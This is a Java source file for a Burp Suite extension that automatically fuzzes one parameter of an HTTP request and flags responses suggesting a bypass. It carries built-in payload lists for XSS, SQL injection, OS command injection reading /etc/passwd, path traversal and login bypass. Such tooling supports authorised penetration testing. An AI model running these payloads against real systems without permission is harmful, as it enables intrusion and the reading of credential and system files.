package com.vista.security.core;

import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IHttpService;
import burp.IBurpExtenderCallbacks;

import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.function.Consumer;

/**
 * Agentic Auto-Exploit Engine for VISTA.
 * Automatically tests payloads and identifies successful bypasses.
 */
public class AutoExploitEngine {

    private final IBurpExtenderCallbacks callbacks;
    private final IExtensionHelpers helpers;
    private final AtomicBoolean isRunning = new AtomicBoolean(false);
    private final AtomicBoolean shouldStop = new AtomicBoolean(false);

    public AutoExploitEngine(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
    }

    /**
     * Result of an exploit attempt.
     */
    public static class ExploitResult {
        public final String parameter;
        public final String payload;
        public final String originalValue;
        public final int statusCode;
        public final int responseLength;
        public final long responseTime;
        public final boolean potentialBypass;
        public final String bypassIndicator;
        public final String responseSnippet;
        public final IHttpRequestResponse requestResponse;

        public ExploitResult(String parameter, String payload, String originalValue,
                           int statusCode, int responseLength, long responseTime,
                           boolean potentialBypass, String bypassIndicator,
                           String responseSnippet, IHttpRequestResponse requestResponse) {
            this.parameter = parameter;
            this.payload = payload;
            this.originalValue = originalValue;
            this.statusCode = statusCode;
            this.responseLength = responseLength;
            this.responseTime = responseTime;
            this.potentialBypass = potentialBypass;
            this.bypassIndicator = bypassIndicator;
            this.responseSnippet = responseSnippet;
            this.requestResponse = requestResponse;
        }
    }

    /**
     * Summary of auto-exploit session.
     */
    public static class ExploitSummary {
        public final List<ExploitResult> allResults = new ArrayList<>();
        public final List<ExploitResult> potentialBypasses = new ArrayList<>();
        public final int totalRequests;
        public final long totalTime;
        public final String targetParameter;

        public ExploitSummary(String targetParameter, int totalRequests, long totalTime) {
            this.targetParameter = targetParameter;
            this.totalRequests = totalRequests;
            this.totalTime = totalTime;
        }

        public boolean hasFindings() {
            return !potentialBypasses.isEmpty();
        }
    }

    /**
     * Configuration for auto-exploit.
     */
    public static class ExploitConfig {
        public String targetParameter;
        public String exploitType; // XSS, SQLi, Command, Path, Auth, Generic
        public int maxPayloads = 50;
        public int delayMs = 100;
        public boolean stopOnFirstFind = false;
        public List<String> customPayloads = new ArrayList<>();
    }

    public boolean isRunning() {
        return isRunning.get();
    }

    public void stop() {
        shouldStop.set(true);
    }

    /**
     * Run auto-exploit on a request.
     */
    public ExploitSummary runExploit(IHttpRequestResponse baseRequest, ExploitConfig config,
                                     Consumer<String> statusCallback, Consumer<ExploitResult> resultCallback) {
        if (isRunning.getAndSet(true)) {
            throw new IllegalStateException("Exploit engine already running");
        }
        shouldStop.set(false);

        long startTime = System.currentTimeMillis();
        int requestCount = 0;

        try {
            // Get baseline response
            statusCallback.accept("Getting baseline response...");
            BaselineInfo baseline = getBaseline(baseRequest);

            // Get payloads for the exploit type
            List<String> payloads = getPayloadsForType(config);
            statusCallback.accept("Loaded " + payloads.size() + " payloads for " + config.exploitType);

            ExploitSummary summary = new ExploitSummary(config.targetParameter, 
                payloads.size(), System.currentTimeMillis() - startTime);

            // Test each payload
            for (int i = 0; i < payloads.size() && !shouldStop.get(); i++) {
                String payload = payloads.get(i);
                statusCallback.accept("Testing payload " + (i + 1) + "/" + payloads.size() + ": " + truncate(payload, 30));

                try {
                    ExploitResult result = testPayload(baseRequest, config.targetParameter, payload, baseline);
                    requestCount++;
                    summary.allResults.add(result);

                    if (result.potentialBypass) {
                        summary.potentialBypasses.add(result);
                        resultCallback.accept(result);

                        if (config.stopOnFirstFind) {
                            statusCallback.accept("Found potential bypass! Stopping as configured.");
                            break;
                        }
                    }

                    // Delay between requests
                    if (config.delayMs > 0 && i < payloads.size() - 1) {
                        Thread.sleep(config.delayMs);
                    }
                } catch (Exception e) {
                    callbacks.printError("Payload test failed: " + e.getMessage());
                }
            }

            summary.allResults.forEach(r -> {}); // finalize
            return summary;

        } finally {
            isRunning.set(false);
        }
    }

    /**
     * Get baseline response characteristics.
     */
    private BaselineInfo getBaseline(IHttpRequestResponse request) {
        BaselineInfo info = new BaselineInfo();
        
        if (request.getResponse() != null) {
            String response = HttpMessageParser.responseToText(helpers, request.getResponse());
            info.statusCode = extractStatusCode(response);
            info.responseLength = request.getResponse().length;
            info.responseBody = response;
            
            // Extract error indicators
            info.hasErrorKeywords = containsErrorKeywords(response);
            info.hasBlockedKeywords = containsBlockedKeywords(response);
        }
        
        return info;
    }

    /**
     * Test a single payload.
     */
    private ExploitResult testPayload(IHttpRequestResponse baseRequest, String parameter, 
                                      String payload, BaselineInfo baseline) throws Exception {
        // Build modified request
        byte[] modifiedRequest = buildModifiedRequest(baseRequest.getRequest(), parameter, payload);
        
        // Get HTTP service
        IHttpService service = baseRequest.getHttpService();
        
        // Send request and measure time
        long startTime = System.currentTimeMillis();
        IHttpRequestResponse response = callbacks.makeHttpRequest(service, modifiedRequest);
        long responseTime = System.currentTimeMillis() - startTime;
        
        // Analyze response
        String responseText = response.getResponse() != null 
            ? HttpMessageParser.responseToText(helpers, response.getResponse()) : "";
        int statusCode = extractStatusCode(responseText);
        int responseLength = response.getResponse() != null ? response.getResponse().length : 0;
        
        // Detect potential bypass
        BypassDetection detection = detectBypass(baseline, responseText, statusCode, responseLength, payload);
        
        // Extract relevant snippet
        String snippet = extractRelevantSnippet(responseText, payload);
        
        // Get original value
        String originalValue = extractParameterValue(
            HttpMessageParser.requestToText(helpers, baseRequest.getRequest()), parameter);
        
        return new ExploitResult(
            parameter, payload, originalValue,
            statusCode, responseLength, responseTime,
            detection.isPotentialBypass, detection.indicator,
            snippet, response
        );
    }

    /**
     * Build request with modified parameter.
     */
    private byte[] buildModifiedRequest(byte[] originalRequest, String parameter, String payload) {
        String requestText = HttpMessageParser.requestToText(helpers, originalRequest);
        String modified = replaceParameterValue(requestText, parameter, payload);
        return modified.getBytes();
    }

    /**
     * Replace parameter value in request.
     */
    private String replaceParameterValue(String request, String parameter, String newValue) {
        String[] lines = request.split("\r\n", 2);
        String firstLine = lines[0];
        String rest = lines.length > 1 ? lines[1] : "";
        
        // Try URL parameters
        if (firstLine.contains(parameter + "=")) {
            firstLine = replaceInQueryString(firstLine, parameter, newValue);
        }
        
        // Try body parameters
        int bodyStart = rest.indexOf("\r\n\r\n");
        if (bodyStart >= 0) {
            String headers = rest.substring(0, bodyStart + 4);
            String body = rest.substring(bodyStart + 4);
            
            if (body.contains(parameter + "=")) {
                body = replaceInQueryString(body, parameter, newValue);
            } else if (body.contains("\"" + parameter + "\"")) {
                // JSON body
                body = replaceInJson(body, parameter, newValue);
            }
            
            rest = headers + body;
        }
        
        // Try cookie
        rest = replaceInCookie(rest, parameter, newValue);
        
        return firstLine + "\r\n" + rest;
    }

    private String replaceInQueryString(String text, String param, String value) {
        // Handle both & and ? prefixes
        String encoded = urlEncode(value);
        text = text.replaceAll("([?&])" + escapeRegex(param) + "=[^&\\s]*", "$1" + param + "=" + encoded);
        return text;
    }

    private String replaceInJson(String json, String param, String value) {
        // Simple JSON replacement - handles "param": "value" and "param": value
        String escaped = value.replace("\\", "\\\\").replace("\"", "\\\"");
        json = json.replaceAll("\"" + escapeRegex(param) + "\"\\s*:\\s*\"[^\"]*\"", 
            "\"" + param + "\": \"" + escaped + "\"");
        json = json.replaceAll("\"" + escapeRegex(param) + "\"\\s*:\\s*([0-9]+)", 
            "\"" + param + "\": \"" + escaped + "\"");
        return json;
    }

    private String replaceInCookie(String headers, String param, String value) {
        String[] lines = headers.split("\r\n");
        StringBuilder result = new StringBuilder();
        
        for (String line : lines) {
            if (line.toLowerCase().startsWith("cookie:")) {
                line = line.replaceAll(escapeRegex(param) + "=[^;\\s]*", param + "=" + urlEncode(value));
            }
            result.append(line).append("\r\n");
        }
        
        return result.toString();
    }

    /**
     * Detect if response indicates a successful bypass.
     */
    private BypassDetection detectBypass(BaselineInfo baseline, String response, 
                                         int statusCode, int responseLength, String payload) {
        BypassDetection detection = new BypassDetection();
        
        // 1. Status code changed from error to success
        if (baseline.statusCode >= 400 && statusCode >= 200 && statusCode < 400) {
            detection.isPotentialBypass = true;
            detection.indicator = "Status changed from " + baseline.statusCode + " to " + statusCode;
            return detection;
        }
        
        // 2. Blocked keywords disappeared
        if (baseline.hasBlockedKeywords && !containsBlockedKeywords(response)) {
            detection.isPotentialBypass = true;
            detection.indicator = "Blocked/error message no longer present";
            return detection;
        }
        
        // 3. Payload reflected without encoding (XSS indicator)
        if (response.contains(payload) && containsXssContext(response, payload)) {
            detection.isPotentialBypass = true;
            detection.indicator = "Payload reflected in dangerous context";
            return detection;
        }
        
        // 4. Significant response length change (might indicate different behavior)
        int lengthDiff = Math.abs(responseLength - baseline.responseLength);
        double lengthRatio = baseline.responseLength > 0 
            ? (double) lengthDiff / baseline.responseLength : 0;
        if (lengthRatio > 0.5 && !containsErrorKeywords(response)) {
            detection.isPotentialBypass = true;
            detection.indicator = "Response length changed significantly (" + lengthDiff + " bytes)";
            return detection;
        }
        
        // 5. SQL error messages (SQLi indicator)
        if (containsSqlErrors(response)) {
            detection.isPotentialBypass = true;
            detection.indicator = "SQL error detected in response";
            return detection;
        }
        
        // 6. Command output patterns
        if (containsCommandOutput(response, payload)) {
            detection.isPotentialBypass = true;
            detection.indicator = "Potential command execution output detected";
            return detection;
        }
        
        return detection;
    }

    private boolean containsErrorKeywords(String response) {
        String lower = response.toLowerCase();
        return lower.contains("error") || lower.contains("invalid") || 
               lower.contains("denied") || lower.contains("forbidden") ||
               lower.contains("not allowed") || lower.contains("blocked");
    }

    private boolean containsBlockedKeywords(String response) {
        String lower = response.toLowerCase();
        return lower.contains("blocked") || lower.contains("waf") ||
               lower.contains("firewall") || lower.contains("security") ||
               lower.contains("malicious") || lower.contains("attack detected");
    }

    private boolean containsXssContext(String response, String payload) {
        int idx = response.indexOf(payload);
        if (idx < 0) return false;
        
        // Check if in script context or unquoted attribute
        String before = response.substring(Math.max(0, idx - 100), idx).toLowerCase();
        return before.contains("<script") || before.contains("javascript:") ||
               before.contains("onerror=") || before.contains("onload=") ||
               (before.contains("=") && !before.contains("=\"") && !before.contains("='"));
    }

    private boolean containsSqlErrors(String response) {
        String lower = response.toLowerCase();
        return lower.contains("sql syntax") || lower.contains("mysql") ||
               lower.contains("postgresql") || lower.contains("ora-") ||
               lower.contains("sqlite") || lower.contains("sqlstate") ||
               lower.contains("unclosed quotation") || lower.contains("quoted string");
    }

    private boolean containsCommandOutput(String response, String payload) {
        // Check for common command output patterns
        if (payload.contains("id") || payload.contains("whoami")) {
            return response.contains("uid=") || response.contains("gid=");
        }
        if (payload.contains("cat /etc/passwd")) {
            return response.contains("root:") || response.contains("/bin/bash");
        }
        if (payload.contains("dir") || payload.contains("ls")) {
            return response.contains("Volume") || response.contains("Directory of") ||
                   response.contains("total ") || response.contains("drwx");
        }
        return false;
    }

    private String extractRelevantSnippet(String response, String payload) {
        int idx = response.indexOf(payload);
        if (idx >= 0) {
            int start = Math.max(0, idx - 50);
            int end = Math.min(response.length(), idx + payload.length() + 50);
            return "..." + response.substring(start, end).replace("\n", " ") + "...";
        }
        
        // Return first part of body
        int bodyStart = response.indexOf("\r\n\r\n");
        if (bodyStart > 0 && bodyStart + 200 < response.length()) {
            return response.substring(bodyStart + 4, Math.min(response.length(), bodyStart + 200)) + "...";
        }
        
        return "(no relevant snippet)";
    }

    private String extractParameterValue(String request, String parameter) {
        // Try URL
        int idx = request.indexOf(parameter + "=");
        if (idx >= 0) {
            int start = idx + parameter.length() + 1;
            int end = request.indexOf("&", start);
            if (end < 0) end = request.indexOf(" ", start);
            if (end < 0) end = request.indexOf("\r", start);
            if (end > start) return request.substring(start, end);
        }
        return "(unknown)";
    }

    private int extractStatusCode(String response) {
        try {
            String firstLine = response.split("\r?\n")[0];
            String[] parts = firstLine.split(" ");
            if (parts.length >= 2) {
                return Integer.parseInt(parts[1]);
            }
        } catch (Exception ignored) {}
        return 0;
    }

    /**
     * Get payloads based on exploit type.
     */
    private List<String> getPayloadsForType(ExploitConfig config) {
        List<String> payloads = new ArrayList<>();
        
        // Add custom payloads first
        payloads.addAll(config.customPayloads);
        
        // Add type-specific payloads
        Map<String, List<String>> library = PayloadLibrary.getAllPayloads();
        
        switch (config.exploitType.toUpperCase()) {
            case "XSS" -> {
                payloads.addAll(library.getOrDefault("XSS", Collections.emptyList()));
                payloads.addAll(getXssBypassPayloads());
            }
            case "SQLI", "SQL" -> {
                payloads.addAll(library.getOrDefault("SQL Injection", Collections.emptyList()));
                payloads.addAll(getSqlBypassPayloads());
            }
            case "COMMAND", "RCE", "OS" -> {
                payloads.addAll(library.getOrDefault("Command Injection", Collections.emptyList()));
                payloads.addAll(getCommandBypassPayloads());
            }
            case "PATH", "LFI", "TRAVERSAL" -> {
                payloads.addAll(library.getOrDefault("Path Traversal", Collections.emptyList()));
                payloads.addAll(getPathBypassPayloads());
            }
            case "AUTH", "BYPASS" -> {
                payloads.addAll(getAuthBypassPayloads());
            }
            default -> {
                // Generic - add common bypass techniques
                payloads.addAll(getGenericBypassPayloads());
            }
        }
        
        // Limit payloads
        if (payloads.size() > config.maxPayloads) {
            payloads = payloads.subList(0, config.maxPayloads);
        }
        
        return payloads;
    }

    // Bypass payload generators
    private List<String> getXssBypassPayloads() {
        return Arrays.asList(
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
            "<img src=x onerror=alert`1`>",
            "<svg/onload=alert(1)>",
            "<IMG SRC=x onerror=alert(1)>",
            "<<script>alert(1)</script>",
            "<scr<script>ipt>alert(1)</script>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
            "<img src=x onerror=\\u0061lert(1)>",
            "\"><img src=x onerror=alert(1)>",
            "'><img src=x onerror=alert(1)>",
            "</script><script>alert(1)</script>",
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<iframe src=\"javascript:alert(1)\">",
            "<object data=\"javascript:alert(1)\">",
            "<embed src=\"javascript:alert(1)\">",
            "<a href=\"javascript:alert(1)\">click</a>",
            "<math><maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert(1)\">click"
        );
    }

    private List<String> getSqlBypassPayloads() {
        return Arrays.asList(
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "1' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "' OR ''='",
            "' OR 1=1--+",
            "'+OR+'1'='1",
            "' OR '1'='1' AND ''='",
            "1 OR 1=1",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' AND '1'='1",
            "1' AND SLEEP(5)--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "' AND 1=1 AND ''='",
            "' AND 1=2 UNION SELECT 1,2,3--"
        );
    }

    private List<String> getCommandBypassPayloads() {
        return Arrays.asList(
            "; id",
            "| id",
            "|| id",
            "& id",
            "&& id",
            "`id`",
            "$(id)",
            "; whoami",
            "| whoami",
            "|| whoami",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& dir",
            "| dir",
            ";id",
            "|id",
            "||id",
            "\n id",
            "\r\n id",
            "| id #"
        );
    }

    private List<String> getPathBypassPayloads() {
        return Arrays.asList(
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "....\\....\\....\\windows\\win.ini",
            "..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "file:///etc/passwd",
            "....//....//etc/passwd",
            "..././..././..././etc/passwd",
            "..;/..;/..;/etc/passwd",
            "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%5c..%5c..%5cwindows%5cwin.ini"
        );
    }

    private List<String> getAuthBypassPayloads() {
        return Arrays.asList(
            "admin",
            "administrator",
            "root",
            "' OR '1'='1",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' OR 1=1--",
            "' OR 1=1#",
            "-1 OR 1=1",
            "true",
            "1",
            "admin' OR '1'='1",
            "admin') OR ('1'='1",
            "admin\" OR \"1\"=\"1"
        );
    }

    private List<String> getGenericBypassPayloads() {
        return Arrays.asList(
            // Case variations
            "TEST", "test", "TeSt",
            // Encoding
            "%74%65%73%74", // "test" URL encoded
            "&#116;&#101;&#115;&#116;", // HTML entities
            // Null bytes
            "test%00",
            "test\0",
            // Unicode
            "ｔｅｓｔ", // fullwidth
            // Double encoding
            "%2574%2565%2573%2574",
            // Whitespace tricks
            " test", "test ", "\ttest", "test\n",
            // Comment injection
            "test/**/", "/**/test",
            // Concatenation
            "te"+"st", "te'+'st"
        );
    }

    private String urlEncode(String s) {
        StringBuilder sb = new StringBuilder();
        for (char c : s.toCharArray()) {
            if (Character.isLetterOrDigit(c) || c == '-' || c == '_' || c == '.' || c == '~') {
                sb.append(c);
            } else {
                sb.append(String.format("%%%02X", (int) c));
            }
        }
        return sb.toString();
    }

    private String escapeRegex(String s) {
        return s.replaceAll("([\\\\\\[\\](){}.*+?^$|])", "\\\\$1");
    }

    private String truncate(String s, int max) {
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }

    // Helper classes
    private static class BaselineInfo {
        int statusCode;
        int responseLength;
        String responseBody;
        boolean hasErrorKeywords;
        boolean hasBlockedKeywords;
    }

    private static class BypassDetection {
        boolean isPotentialBypass = false;
        String indicator = "";
    }
}
